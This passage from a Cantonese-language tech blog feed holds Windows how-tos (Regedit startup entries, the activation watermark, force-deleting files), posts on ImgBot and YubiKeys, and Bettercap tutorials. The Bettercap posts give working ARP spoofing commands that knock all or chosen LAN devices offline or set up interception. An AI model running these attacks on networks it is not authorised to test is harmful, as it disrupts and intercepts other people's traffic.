<h2 id="程式畫面"><a href="#程式畫面" class="headerlink" title="程式畫面"></a>程式畫面</h2><img src="/2022/06/14/Windows-Tools-Create-Bootable-USB-drives-Yumi/yumi-program.png" class="">]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>BIOS</tag>
        <tag>Gui</tag>
      </tags>
  </entry>
  <entry>
    <title>Rufus - USB 驅動器工具 (Windows)</title>
    <url>/2021/12/16/Windows-Tools-Create-Bootable-USB-drives-rufus/</url>
    <content><![CDATA[<img src="/2021/12/16/Windows-Tools-Create-Bootable-USB-drives-rufus/rufus.png" class="">

<h1 id="Rufus"><a href="#Rufus" class="headerlink" title="Rufus"></a>Rufus</h1><p>Rufus 係一個幫你 Create 一個可以啟動 USB 驅動器既 Program。</p>
<p>【官方網站】：<a href="https://rufus.ie/en/">按這裡</a><br>【程式語言】：多國語言 (有粵語 !!)<br>【Github】：<a href="https://github.com/pbatard/rufus">按這裡</a></p>
<h1 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h1><img src="/2021/12/16/Windows-Tools-Create-Bootable-USB-drives-rufus/rufus-2.png" class="">]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>BIOS</tag>
        <tag>Gui</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows - 刪除開機啟動程式 (Regedit 登錄檔)</title>
    <url>/2022/07/06/Windows-delete-startup-program-with-regedit/</url>
    <content><![CDATA[<img src="/img/Post/image/Regedit/Registry_Editor_icon.png" width="200px"/>

<h1 id="什麼是-Regedit-登錄檔？"><a href="#什麼是-Regedit-登錄檔？" class="headerlink" title="什麼是 Regedit 登錄檔？"></a>什麼是 Regedit 登錄檔？</h1><p>Regedit 是一個分層數據庫，用於存儲計算機高效運行所需的配置設置，此信息包括：</p>
<ol>
<li>基本啟動功能</li>
<li>用戶配置文件信息</li>
<li>啟動選項</li>
<li>已安裝的應用程序和驅動程序</li>
<li>系統硬件信息和特定設計設置</li>
</ol>
<p>另外，如果修改不正確，操作系統有可能會停止運作又或者會程式運行失敗，雖然你可以導出 <code>.REG</code> 文件，但其實大部份情況其實也不需要修改。</p>
<h1 id="自動啟動的影響"><a href="#自動啟動的影響" class="headerlink" title="自動啟動的影響"></a>自動啟動的影響</h1><p>某啲程式會喺你安裝完之後幫你整埋個開機就會開程式，咁樣既設定固然係方便，但係當你部機係老爺機，又或者程式越黎越多既時候，呢個自動開啟會變成你電腦既負擔，繼而電腦變慢。</p>
<p>而今篇文會教你點樣刪除開機啟動程式，我地會需要用到 Windows 內建既 <code>Regedit</code>。</p>
<p><img src="slow.png"></p>
<h1 id="開啟-Regedit-登錄檔"><a href="#開啟-Regedit-登錄檔" class="headerlink" title="開啟 Regedit 登錄檔"></a>開啟 Regedit 登錄檔</h1><p>直接在 Windows 右下角尋找 <code>regedit</code>。</p>
<p><img src="start.png"></p>
<h2 id="進入路徑"><a href="#進入路徑" class="headerlink" title="進入路徑"></a>進入路徑</h2><p>進入這個路徑：</p>
<pre><code>電腦\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
</code></pre>
<div class="note info flat">
    說明：系統是使用繁體中文的 Windows 複製上面的路徑即可，如果不是的話直接將 <code>電腦</code> 改為你的系統語言即可。
</div>

<p><img src="Run.gif"></p>
<h2 id="刪除名單"><a href="#刪除名單" class="headerlink" title="刪除名單"></a>刪除名單</h2><p>我們可以看到上圖有三個項目，包括：</p>
<ol>
<li><code>com.squirrel.Teams.Teams</code>,</li>
<li><code>Discord</code>,</li>
<li><code>net.mullvad.vpn</code>，</li>
</ol>
<p>以上三個項目說明了每當電腦啟用的時候，會開啟這三個程式。</p>
<p>假設我不想要 <code>com.squirrel.Teams.Teams</code> (Microsoft Teams) 和 <code>Discord</code>，我們只需要將這兩個項目刪除就可以了。</p>
<p>以下送上影片示範：</p>
<p><img src="898.gif"></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Regedit</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows 7/8/10/11 系統 - 免啟動系統去除桌面中的 &quot;啟用 Windows 水印&quot;</title>
    <url>/2022/06/12/Windows-disabled-windows-desktop-watermark/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Blog 主我絕不會推薦流氓軟件達至修改電腦，<br>本教學不需使用任何第三方軟件。</p>
<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><p>當你仲未啟用 Windows 既時候，<br>你右下角會出現</p>
<blockquote>
<p>啟用 Windows<br>移至 [設定] 以啟用 Windows。</p>
</blockquote>
<img src="/2022/06/12/Windows-disabled-windows-desktop-watermark/hi.png" class="">

<p>要移除我們需要修改 <code>regedit</code> (登錄檔)。<br>以下教學。</p>
<h2 id="開啟-Regedit-登錄檔"><a href="#開啟-Regedit-登錄檔" class="headerlink" title="開啟 Regedit 登錄檔"></a>開啟 Regedit 登錄檔</h2><p>呢次我地同上一個 Post 唔一樣，<br>上次係可以分開咁 set，<br>今次就要用 <code>系統管理員</code> 開啟你既 Regedit。</p>
<img src="/2022/06/12/Windows-disabled-windows-desktop-watermark/regedit.png" class="">

<h2 id="進入路徑"><a href="#進入路徑" class="headerlink" title="進入路徑"></a>進入路徑</h2><p>我地入到黎就入呢個 Paths</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">電腦\HKEY_CURRENT_USER\Control Panel\Desktop</span><br></pre></td></tr></table></figure>

<img src="/2022/06/12/Windows-disabled-windows-desktop-watermark/GO.png" class="">

<h2 id="修改檔案"><a href="#修改檔案" class="headerlink" title="修改檔案"></a>修改檔案</h2><p>搵一個名叫 <code>PaintDesktopVersion</code> 既檔，<br>撳入去再將原本既數值 <code>0</code> 改做 <code>1</code>，<br>改完之後再確定。</p>
<img src="/2022/06/12/Windows-disabled-windows-desktop-watermark/PaintDesktopVersion.png" class="">

<h2 id="重開電腦"><a href="#重開電腦" class="headerlink" title="重開電腦"></a>重開電腦</h2><p>呢次既修改係會將你所有 user 都會改變，<br>但係我地呢次係需要重新開你部電腦，<br>當你再開機既時候就會發現，<br>你原本右下角既水印係已經消失左。</p>
<p>如果你想開返既話只需要將 <code>PaintDesktopVersion</code> 改返做 <code>1</code> 就得了。</p>
<img src="/2022/06/12/Windows-disabled-windows-desktop-watermark/restart.png" class="">]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>撳制</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows - 找不到此項目 (空檔案無法刪除)</title>
    <url>/2022/06/03/Windows-not-found-files-cannot-delete-fix/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有陣時因為用左 commands line 或者用左其他方法生產左個左唔係你預期既檔案，<br>你手動去 delete 但係又 delete 唔到，<br>呢個時候我地需要用指令去 delete，<br>以下教學。</p>
<img src="/2022/06/03/Windows-not-found-files-cannot-delete-fix/WTF.png" class="">


<h1 id="Batch"><a href="#Batch" class="headerlink" title="Batch"></a>Batch</h1><p>強制刪除，<br>bat檔案入面打以下呢3句，<br>然後將你想刪除既檔案拉入去呢個 bat 檔案入面。</p>
<ul>
<li><p>del (刪除檔案)</p>
</li>
<li><p>/F (強制刪除唯讀檔案)</p>
</li>
<li><p>/A (根據屬性選取要刪除的檔案)</p>
</li>
<li><p>/Q (安靜模式，不再顯示刪除確認框)</p>
</li>
<li><p>rd (移除目錄)</p>
</li>
<li><p>/S (移除目錄裡所有的目錄與檔案，但不移除目錄本身)</p>
</li>
<li><p>/Q (安靜模式，不再顯示刪除確認框)</p>
</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">DEL</span> /F /A /Q \\?\%<span class="number">1</span></span><br><span class="line"><span class="built_in">RD</span> /S /Q \\?\%<span class="number">1</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<img src="/2022/06/03/Windows-not-found-files-cannot-delete-fix/done.gif" class="">

<h1 id="意思"><a href="#意思" class="headerlink" title="意思"></a>意思</h1><ul>
<li><code>\\?\</code></li>
</ul>
<p><code>\\</code> 是指UNC路徑(Universal Naming Convention)，以雙後斜線開頭就是，如 <code>\\192.168.1.X\sharefiles\</code> 或 <code>\\PC10\ShareFiles\job.doc</code>。<br>所以以雙後斜線開頭指的就是網路位址(通常是區網)，相對的以單後斜線開頭指的就是本機電腦路徑，如「D:\」</p>
<p>「？」在cmd指令中是指萬用字元，代表著1個的任意字元(而*是代長n個的任意字元)，但在這裡卻是特例(最討厭這種…)，這裡的問號是代表著路徑長度可達到系統上限。<br>正常的檔案路徑是260字元以內，但若以 <code>\\?\</code> 開頭的路徑卻能達到32000個字元。所以如果路徑太長或檔名無法讀取的，在路徑前加上這指令通常都能解決。</p>
<h2 id="強制"><a href="#強制" class="headerlink" title="強制"></a>強制</h2><p>如再有這情況，<br>有兩個選擇，<br>改名或者刪除，<br>以上的是 bat 檔方法，<br>以下的是指令方法。</p>
<p>改名方法 :</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">RENAME</span> \\?\%<span class="number">1</span> testing.txt</span><br></pre></td></tr></table></figure>

<p>刪除方法 :</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">del</span> \\?\%<span class="number">1</span> testing.txt</span><br></pre></td></tr></table></figure>

<p>參考資料:<br><a href="https://syu65406.tw/blog/168/win-7-10%E3%80%8C%E6%89%BE%E4%B8%8D%E5%88%B0%E6%AD%A4%E9%A0%85%E7%9B%AE%E3%80%8D%EF%BC%8D%E6%AA%94%E6%A1%88%E6%88%96%E8%B3%87%E6%96%99%E5%A4%BE%E7%84%A1%E6%B3%95%E5%88%AA%E9%99%A4%E7%9A%84%E5%95%8F">https://syu65406.tw/blog/168/win-7-10%E3%80%8C%E6%89%BE%E4%B8%8D%E5%88%B0%E6%AD%A4%E9%A0%85%E7%9B%AE%E3%80%8D%EF%BC%8D%E6%AA%94%E6%A1%88%E6%88%96%E8%B3%87%E6%96%99%E5%A4%BE%E7%84%A1%E6%B3%95%E5%88%AA%E9%99%A4%E7%9A%84%E5%95%8F</a><br><a href="https://www.e-show.tw/index.php?option=module&amp;lang=cht&amp;task=pageinfo&amp;id=3&amp;pages=4">https://www.e-show.tw/index.php?option=module&amp;lang=cht&amp;task=pageinfo&amp;id=3&amp;pages=4</a></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Batch</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows Start Menu 說明</title>
    <url>/2022/07/06/Windows-start-menu/</url>
    <content><![CDATA[<img src="/img/Post/image/Windows/cover.svg" width="200px"/>

<h1 id="什麼是-Start-Menu？"><a href="#什麼是-Start-Menu？" class="headerlink" title="什麼是 Start Menu？"></a>什麼是 Start Menu？</h1><p>Microsoft Windows Start Menu 是 Windows中尋找已安裝程式和尋找任何文件或文件夾的主要位置。<br>默認情況下，通過單擊 Windows 左下角的開始來啟動 Start Menu<br>下圖就是 Windows 10 Start Menu 的例子。</p>
<div class="note info flat">
    通常來說我也不會將 Start Menu 項目刪除，但如果你不想該項目被尋找到，可以將他刪除
</div>

<p><img src="startupmenu.png"></p>
<h1 id="開啟-Start-Menu-路徑位置"><a href="#開啟-Start-Menu-路徑位置" class="headerlink" title="開啟 Start Menu 路徑位置"></a>開啟 Start Menu 路徑位置</h1><p>Start Menu 有分兩個位置，一個是 Global User，一個是 Current User。</p>
<p>如要開啟，直接使用檔案總管然後開啟路徑，而路徑說明會在下方。</p>
<div class="note warning flat">
    注意：如上方所說明的一樣，如果新增一項會讓你能在右下方尋找到程式並開啟，但如果刪除就不能再於右下方尋找相應的程式。
</div>

<h2 id="Global-User-Path"><a href="#Global-User-Path" class="headerlink" title="Global User Path"></a>Global User Path</h2><p>這是所有用戶的 Global User Start Menu 位置：</p>
<pre><code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs
</code></pre>
<p><img src="global.gif"></p>
<h2 id="Current-User-Path"><a href="#Current-User-Path" class="headerlink" title="Current User Path"></a>Current User Path</h2><p>這是當前登錄用戶的個人 Start Menu 的位置：</p>
<pre><code>C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
</code></pre>
<p><img src="current.gif"></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
  </entry>
  <entry>
    <title>ImgBot - Compress your Repositories image size</title>
    <url>/2022/07/04/add-imgbot-to-your-repositories/</url>
    <content><![CDATA[<img src="imgbot.svg" width="200px"/>

<h1 id="Imgbot"><a href="#Imgbot" class="headerlink" title="Imgbot"></a>Imgbot</h1><p>imgbot is a tool that compresses all the images in your repo, thereby reducing the image size required by the repo.</p>
<ul>
<li>if repo is open source, imgbot is free for you</li>
<li>This is a gift from the github page (i think)</li>
</ul>
<h1 id="Install-Imgbot"><a href="#Install-Imgbot" class="headerlink" title="Install Imgbot"></a>Install Imgbot</h1><p>before start, We need to enter the official website of imgbot.</p>
<pre><code>https://imgbot.net/
</code></pre>
<p><img src="1.png"></p>
<hr>
<h2 id="Install-Step-1-Try-for-free"><a href="#Install-Step-1-Try-for-free" class="headerlink" title="Install - Step 1 (Try for free)"></a>Install - Step 1 (Try for free)</h2><p>click the button <code>Try for free</code>.</p>
<p><img src="2.png"></p>
<h2 id="Install-Step-2-Set-up-a-free-trial"><a href="#Install-Step-2-Set-up-a-free-trial" class="headerlink" title="Install - Step 2 (Set up a free trial)"></a>Install - Step 2 (Set up a free trial)</h2><p>after that, we now will redirect to this page (look below image).</p>
<p>now click the button <code>Set up a free trial</code>.</p>
<pre><code>https://github.com/marketplace/imgbot
</code></pre>
<p><img src="3.png"></p>
<h2 id="Install-Step-3-Price-and-setup"><a href="#Install-Step-3-Price-and-setup" class="headerlink" title="Install - Step 3 (Price and setup)"></a>Install - Step 3 (Price and setup)</h2><p>now, select the <code>Open source</code> item, and then click the <code>Install it for free</code> button.</p>
<p><img src="4.png"></p>
<h2 id="Install-Step-4-Review-your-order"><a href="#Install-Step-4-Review-your-order" class="headerlink" title="Install - Step 4 (Review your order)"></a>Install - Step 4 (Review your order)</h2><p>now,look your order, Check if there is any problem with your information, if not click the button <code>Complete order and begin installation</code>.</p>
<p><img src="5.gif"></p>
<h2 id="Install-Step-5-Install-Imgbot"><a href="#Install-Step-5-Install-Imgbot" class="headerlink" title="Install - Step 5 (Install Imgbot)"></a>Install - Step 5 (Install Imgbot)</h2><p>now, select what repo your what to install,in my case is only select one repo, that is my github page.</p>
<p><img src="7.gif"></p>
<h2 id="Install-Final-Step-Authorize-Imgbot"><a href="#Install-Final-Step-Authorize-Imgbot" class="headerlink" title="Install - Final Step (Authorize Imgbot)"></a>Install - Final Step (Authorize Imgbot)</h2><p>click the button <code>Authorize Imgbot</code>.</p>
<div class="note info flat">
    this step is for Requires your repo permissions.
</div>

<p><img src="8.gif"></p>
<h2 id="Install-Done"><a href="#Install-Done" class="headerlink" title="Install - Done"></a>Install - Done</h2><p>finally, finish the install for your repo.</p>
<p>now, just waiting imgbot give you a <code>Pull requests</code>.</p>
<p><img src="9.png"></p>
<h1 id="Check-your-Account-Applications"><a href="#Check-your-Account-Applications" class="headerlink" title="Check your Account Applications"></a>Check your Account Applications</h1><p>right now you can go to your account settings,and then on below click the <code>Applications</code> button.</p>
<p>after that, you can see the Imgbot has been added.</p>
<p><img src="c.png"></p>
<h1 id="Pull-Requests"><a href="#Pull-Requests" class="headerlink" title="Pull Requests"></a>Pull Requests</h1><p>After a point in time, imgbot will send you a pull quests.</p>
<p><img src="10.png"></p>
]]></content>
  </entry>
  <entry>
    <title>YubiKeys USB Security Key - 硬件認證裝置</title>
    <url>/2022/05/30/YubiKeys-Hardware/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>假設電腦一早已經俾人入侵左既時候，<br>而你呢個時候又用電腦黎登入唔同既野，<br>咁樣 Hacker (入侵者)，<br>就會好易拎到你既密碼，<br>拎到之後就可以入去搞搞震。</p>
<p>而呢個時候，<br>我地如果有用 2FA 就可以減低被入侵帳號既風險，<br>但如果又萬一，<br>你用既裝置都已經俾人 Hack 哂，<br>咁樣出現喺你令一部機既認證碼只會俾 Hacker 見到，<br>咁樣一樣咁唔安全。</p>
<p>呢個時候，<br>使用裝設式既 2FA 認證可以冇左呢個情況，<br>但係呢個唔係免費，<br>需要你去買。</p>
<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p>用法係需要你將呢隻 USB 綁定喺個帳號，<br>咁樣每當你登入既時候，<br>你需要插呢隻 USB 去做一個認證，<br>咁樣先俾你登入。</p>
<img src="/2022/05/30/YubiKeys-Hardware/pg1.png" class="">

<h2 id="Support-網站"><a href="#Support-網站" class="headerlink" title="Support 網站"></a>Support 網站</h2><ul>
<li>Github</li>
<li>Google</li>
<li>Microsoft</li>
<li>Amazon</li>
<li>ebay</li>
<li>citrix</li>
<li>salesforce</li>
<li>DropBox</li>
<li>Facebook</li>
<li>Twitter</li>
</ul>
<h2 id="官網"><a href="#官網" class="headerlink" title="官網"></a>官網</h2><ul>
<li><a href="https://www.yubico.com/">https://www.yubico.com/</a></li>
</ul>
<h2 id="香港"><a href="#香港" class="headerlink" title="香港"></a>香港</h2><p>豐澤係有賣。</p>
<ul>
<li><a href="https://www.fortress.com.hk/en/product/yubikey-5ci-security-key/p/BP_12071658">https://www.fortress.com.hk/en/product/yubikey-5ci-security-key/p/BP_12071658</a></li>
</ul>
<p><a href="https://oneonemall.com/collections/yubico">https://oneonemall.com/collections/yubico</a></p>
]]></content>
      <categories>
        <category>Hardware</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Bettercap arp.spoof - ARP 欺騙攻擊工具</title>
    <url>/2022/01/15/bettercap-arp-spoof/</url>
    <content><![CDATA[<img src="/img/Post/image/Bettercap/cover.svg" width="200px"/>

<h1 id="重要提示"><a href="#重要提示" class="headerlink" title="重要提示"></a>重要提示</h1><p>要進行任何操作都要記得開左 net.probe 先會得，<br>因為你唔 Scan 個 Network 咁個工具就唔知入面有乜 Device。<br>咁就唔會行到呢個工具既所有指令。</p>
<h1 id="ARP-Spoof-指令"><a href="#ARP-Spoof-指令" class="headerlink" title="ARP Spoof 指令"></a>ARP Spoof 指令</h1><p>可以咁講，一個用黎斷人上網，或者用黎將截取人地上網既野既一個模塊。</p>
<p>使用精心設計的 ARP 數據包不斷欺騙網絡上的選定主機，以執行 MITM 攻擊，斷開目標網路。</p>
<hr>
<h2 id="功擊全部裝置-預設"><a href="#功擊全部裝置-預設" class="headerlink" title="功擊全部裝置 (預設)"></a>功擊全部裝置 (預設)</h2><p>將除左現時操作既裝置除非，其餘既裝置進行 ARP Spoof (斷佢上網)。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp.ban on</span><br></pre></td></tr></table></figure>

<img src="/2022/01/15/bettercap-arp-spoof/arp.ban%20on%200.png" class="">

<h2 id="指定功擊這幾部裝置網路"><a href="#指定功擊這幾部裝置網路" class="headerlink" title="指定功擊這幾部裝置網路"></a>指定功擊這幾部裝置網路</h2><p>淨係指定 Ban 呢幾部機 <code>192.168.0.2</code>, <code>192.168.0.3</code>, <code>192.168.0.4</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set arp.spoof.targets 192.168.0.2-4; arp.spoof on</span><br></pre></td></tr></table></figure>

<h2 id="功擊指定裝置網路"><a href="#功擊指定裝置網路" class="headerlink" title="功擊指定裝置網路"></a>功擊指定裝置網路</h2><p>淨係指定 Ban 呢部機 <code>192.168.0.100</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set arp.spoof.targets 192.168.0.100; arp.ban on</span><br></pre></td></tr></table></figure>

<h3 id="重置指定目標名單"><a href="#重置指定目標名單" class="headerlink" title="重置指定目標名單"></a>重置指定目標名單</h3><p>reset 你既 target list …<br>暫時淨係搵到呢個方法 …<br>就係用你而加呢個 Gateway IP 再 /24 replace …</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.0.0/24 &gt; 192.168.0.155  » set arp.spoof.targets 192.168.0.0/24</span><br></pre></td></tr></table></figure>

<h2 id="白名單指定裝置"><a href="#白名單指定裝置" class="headerlink" title="白名單指定裝置"></a>白名單指定裝置</h2><p>除左指定既呢部 Device Whitelist 其他就由鳩佢照打</p>
<ul>
<li><code>192.168.0.100</code> 加入排除 Device (白名單)。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.0.0/24 &gt; 192.168.0.155  » set arp.spoof.whitelist 192.168.0.155</span><br><span class="line">192.168.0.0/24 &gt; 192.168.0.155  » arp.ban on</span><br></pre></td></tr></table></figure>

<h3 id="重置白名單列表"><a href="#重置白名單列表" class="headerlink" title="重置白名單列表"></a>重置白名單列表</h3><p>reset 你既 whilelist，暫時淨係搵到呢個方法 …<br>就係用你而加呢個 ip replace …</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.0.0/24 &gt; 192.168.0.155  » set arp.spoof.whitelist 192.168.0.155</span><br></pre></td></tr></table></figure>

<h2 id="停止所有功擊"><a href="#停止所有功擊" class="headerlink" title="停止所有功擊"></a>停止所有功擊</h2><p>停止所有功擊只需要輸入以下指令 :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.0.0/24 &gt; 192.168.0.155  » arp.ban off</span><br></pre></td></tr></table></figure>

<p>參考資料 :<br><a href="https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/">https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/</a></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Bettercap</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux - 安裝 Bettercap (MITM 中間人功擊)</title>
    <url>/2022/01/14/bettercap-commands/</url>
    <content><![CDATA[<img src="/2022/01/14/bettercap-commands/logo.png" class="">

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://github.com/bettercap/bettercap">Bettercap</a> 是一個用 Go 編寫的強大、易於擴展和便攜的框架，旨在為安全研究人員、紅隊人員和逆向工程師提供一個易於使用的一體化解決方案，具有執行偵察和攻擊可能需要的所有功能 WiFi 網絡、低功耗藍牙設備、無線 HID 設備和以太網。 </p>
<h1 id="Main-Features"><a href="#Main-Features" class="headerlink" title="Main Features"></a>Main Features</h1><ul>
<li><strong>WiFi</strong> networks scanning, <a href="https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/">deauthentication attack</a>, <a href="https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/">clientless PMKID association attack</a> and automatic WPA/WPA2 client handshakes capture.</li>
<li><strong>Bluetooth Low Energy</strong> devices scanning, characteristics enumeration, reading and writing.</li>
<li>2.4Ghz wireless devices scanning and <strong>MouseJacking</strong> attacks with over-the-air HID frames injection (with DuckyScript support).</li>
<li>Passive and active IP network hosts probing and recon.</li>
<li><strong>ARP, DNS, NDP and DHCPv6 spoofers</strong> for MITM attacks on IPv4 and IPv6 based networks.</li>
<li>A powerful <a href="https://www.bettercap.org/modules/core/api.rest/">REST API</a> with support for asynchronous events notification on websocket to orchestrate your attacks easily.</li>
</ul>
<h1 id="安裝-Bettercap"><a href="#安裝-Bettercap" class="headerlink" title="安裝 Bettercap"></a>安裝 Bettercap</h1><p>幾乎所有套裝管理員也會有 Bettercap，例如 <code>pacman</code>, <code>apt</code>，所以不用擔心沒有，即使沒有你也可以用 source code build。</p>
<hr>
<h2 id="Kali-下載-Bettercap"><a href="#Kali-下載-Bettercap" class="headerlink" title="Kali 下載 Bettercap"></a>Kali 下載 Bettercap</h2><p>Kali 原本是沒有 Bettercap，所以你需要手動下載。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install bettercap -y</span><br></pre></td></tr></table></figure>

<img src="/2022/01/14/bettercap-commands/i.png" class="">

<h1 id="開啟-Bettercap"><a href="#開啟-Bettercap" class="headerlink" title="開啟 Bettercap"></a>開啟 Bettercap</h1><p>如要開啟 Bettercap，你必須要使用系統管理員權限開啟 Bettercap。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo bettercap</span><br></pre></td></tr></table></figure>

<img src="/2022/01/14/bettercap-commands/s.png" class="">

<h2 id="查看指令"><a href="#查看指令" class="headerlink" title="查看指令"></a>查看指令</h2><p>如要查看指令列表，直接輸入以下指令 :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">help</span><br></pre></td></tr></table></figure>

<img src="/2022/01/14/bettercap-commands/help.png" class="">]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Bettercap</tag>
      </tags>
  </entry>
  <entry>
    <title>Bettercap - 安裝 caplets 額外工具</title>
    <url>/2022/01/14/bettercap-install-caplets/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Bettercap 既 Caplets read 唔到？<br>就算打完 <code>caplets.update</code> 都係咁？<br>咁係因為唔知點解佢係冇裝到俾你，呢個係 Bettercap 問題<br>咁我地手動裝返就 OK …</p>
<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><p>手動安裝我地要確保你部機係有以下兩樣野 : <code>make</code>, <code>git</code>。</p>
<hr>
<h2 id="下載-git-clone"><a href="#下載-git-clone" class="headerlink" title="下載 (git clone)"></a>下載 (git clone)</h2><p>首先 git clone 以下呢個位置。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/bettercap/caplets.git</span><br></pre></td></tr></table></figure>

<img src="/2022/01/14/bettercap-install-caplets/1.png" class="">

<h2 id="cd-caplets"><a href="#cd-caplets" class="headerlink" title="cd caplets"></a>cd caplets</h2><p>下載完就 <code>cd</code> 入去。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd caplets</span><br></pre></td></tr></table></figure>

<img src="/2022/01/14/bettercap-install-caplets/cd.png" class="">

<h2 id="make-install"><a href="#make-install" class="headerlink" title="make install"></a>make install</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<img src="/2022/01/14/bettercap-install-caplets/3.png" class="">

<h2 id="確定安裝成功"><a href="#確定安裝成功" class="headerlink" title="確定安裝成功"></a>確定安裝成功</h2><hr>
<h3 id="進入-Bettercap"><a href="#進入-Bettercap" class="headerlink" title="進入 Bettercap"></a>進入 Bettercap</h3><p>當你安裝好之後，先入去 bettercap。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo bettercap</span><br></pre></td></tr></table></figure>


<img src="/2022/01/14/bettercap-install-caplets/4.png" class="">

<h3 id="確定已有名單"><a href="#確定已有名單" class="headerlink" title="確定已有名單"></a>確定已有名單</h3><p>輸入以下指令列出名單。</p>
<blockquote>
<p>說明 : 我都唔知點解樣樣都會出現兩行，我諗係 bettercap 問題，但唔影響用個陣既。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">caplets.show</span><br></pre></td></tr></table></figure>

<img src="/2022/01/14/bettercap-install-caplets/5.png" class="">

<p>參考資料:<br><a href="https://githubhelp.com/bettercap/caplets">https://githubhelp.com/bettercap/caplets</a><br><a href="https://github.com/bettercap/caplets">https://github.com/bettercap/caplets</a><br><a href="https://githubhelp.com/bettercap/caplets">https://githubhelp.com/bettercap/caplets</a></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>指令</tag>
        <tag>Bettercap</tag>
      </tags>
  </entry>
  <entry>
    <title>Bettercap net.probe - 偵查網路內有的裝置</title>
    <url>/2022/01/15/bettercap-net-probe/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文章會使用 Bettercap 內的 <a href="https://www.bettercap.org/modules/ethernet/net.probe/">net.probe</a>，使用後該模塊將向當前子網中的每個 IP 發送不同類型的探測包，以便 net.recon 檢測。</p>
<h1 id="掃瞄路由器裝置並列出資訊"><a href="#掃瞄路由器裝置並列出資訊" class="headerlink" title="掃瞄路由器裝置並列出資訊"></a>掃瞄路由器裝置並列出資訊</h1><p>使用 <code>root</code> 權限開啟 Bettercap 後，輸入以下指令開啟 <code>net-probe</code>，<br>輸入後會發現一直輸出不同的裝置 IP，名稱，Mac Address，這些都是你的網路上有的裝置。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net.probe on</span><br></pre></td></tr></table></figure>

<img src="/2022/01/15/bettercap-net-probe/net.probe%200.png" class="">


<h2 id="列出已掃瞄裝置資訊"><a href="#列出已掃瞄裝置資訊" class="headerlink" title="列出已掃瞄裝置資訊"></a>列出已掃瞄裝置資訊</h2><p>如果你想要目前已偵查的裝置並完整將他列出的話，可以輸入以下指令 :</p>
<blockquote>
<p>原理 : 不斷對不同的裝置發出探測包，從而請求訊號，再確定對方已經上線。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net.show</span><br></pre></td></tr></table></figure>

<img src="/2022/01/15/bettercap-net-probe/net.show%200.png" class="">

